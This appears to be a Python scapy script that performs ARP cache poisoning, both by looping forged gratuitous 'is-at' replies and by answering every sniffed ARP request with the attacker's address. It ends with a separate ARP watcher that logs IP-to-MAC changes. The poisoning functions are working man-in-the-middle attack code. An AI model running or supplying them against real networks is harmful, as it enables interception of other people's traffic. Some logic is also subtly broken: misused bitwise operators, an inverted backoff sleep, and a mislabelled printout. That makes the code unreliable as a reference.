import sys
import time
import logging
logging.getLogger("scapy").setLevel(logging.CRITICAL)
from scapy.all import sniff, sendp, get_if_addr, ARP, Ether, IP
from signal import signal , SIGINT

def check_poisoned(pkt, iface, target_ip, fake_ip):
    for p in pkt:
        myMac = Ether().src
        myIP = get_if_addr(iface)
        if p[Ether].dst != myMac:
            return False
        if p[IP] & (p[IP].src != target_ip | p[IP].dst == myIP):
            return False
        return True

def grat_arp_poison(iface, target_ip, fake_ip, backoff):   
    print("Gratuitous ARP cache poisoning:")
    ethernet = Ether()
    arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
    packet = ethernet / arp
    while True:
        print("Sending poisoned arp reply packet")
        if not backoff:
            pkt = sniff(iface=iface, store=False, filter='ip', count=5)
            if (check_poisoned(pkt, iface, target_ip, fake_ip)):
                print("Received proof target's cache is poisoned, sleeping for 30 seconds.")
                time.sleep(backoff)
        sendp(packet , iface=iface)
        time.sleep(1)

def callback_arp_poison_check(pkt, iface, target_ip, fake_ip):   
    if pkt[ARP].op != 1:
        return
    elif target_ip != 0 and pkt[ARP].psrc != target_ip:
        return
    if fake_ip != 0 and pkt[ARP].pdst != fake_ip:
        return
    
    answer = Ether(dst=pkt[ARP].hwsrc) / ARP()
    answer[ARP].op = "is-at"
    answer[ARP].hwdst = pkt[ARP].hwsrc
    answer[ARP].psrc = pkt[ARP].pdst
    answer[ARP].pdst = pkt[ARP].psrc

    print ("Fooling " + pkt[ARP].psrc + " that " + pkt[ARP].pdst + " is me")

    sendp(answer, iface=iface)

def arp_poison_callback(iface, target_ip, fake_ip):
    print("Callback ARP cache poisoning:")
    print(f"iface: {iface}, target_ip: { target_ip if target_ip != 0 else 'All'}, fake_ip: {target_ip if target_ip != 0 else 'All'}")
    sniff(prn=lambda pkt: callback_arp_poison_check(pkt, iface, target_ip, fake_ip), 
	filter="arp", iface=iface, store=False)

arp_watcher_db_file = "arp-watcher.db"
ip_mac = {}

# Save ARP table on shutdown
def sig_int_handler(signum , frame):
    print ("Got SIGINT. Saving ARP database ...")
    try:
        f = open(arp_watcher_db_file , "w")

        for (ip , mac) in ip_mac.items():
            if ip and mac:
                print (f"Saving {ip} {mac}")
                f.write(ip + " " + mac + "\n")

        f.close()
        print (" Done.")
    except IOError:
        print (" Cannot write file " + arp_watcher_db_file )

    sys.exit (1)


def watcher_process_pkt(pkt):
    # got is -at pkt (ARP response)
    if pkt[ARP].op == 2:
        print(pkt[ARP].hwsrc + " " + pkt[ARP].psrc)

    # Device is new.
    if ip_mac.get(pkt[ARP].psrc) == None:
        print (" Found new device " + pkt[ARP].hwsrc + " " + pkt[ARP].psrc)
        ip_mac[pkt[ARP].psrc] = pkt[ARP]. hwsrc
        return

    # Device is known but has a different IP
    if ip_mac.get(pkt[ARP].psrc) and ip_mac[pkt[ARP].psrc] != pkt[ARP].hwsrc:
        print(pkt[ARP].hwsrc + " has got new ip " + pkt[ARP].psrc + " (old " + ip_mac[pkt[ARP].psrc]+ ")")
        ip_mac[pkt[ARP].psrc] = pkt[ARP].hwsrc

def apr_watcher(iface):
    
    signal(SIGINT, sig_int_handler)

    if len(sys.argv) < 2:
        print(sys.argv [0] + " <iface >")
        sys.exit (0)

    try:
        try:
            fh = open(arp_watcher_db_file , "x")
            print ("Created file arp-watcher.db")
        except FileExistsError:
            pass
        fh = open(arp_watcher_db_file , "r")
    except IOError:
        print (" Cannot read file " + arp_watcher_db_file )
        sys.exit (1)

    for line in fh:
        (ip , mac) = line.split(" ")
        ip_mac[ip] = mac[:-1]

    sniff(prn=watcher_process_pkt, filter="arp", iface=iface, store=0)
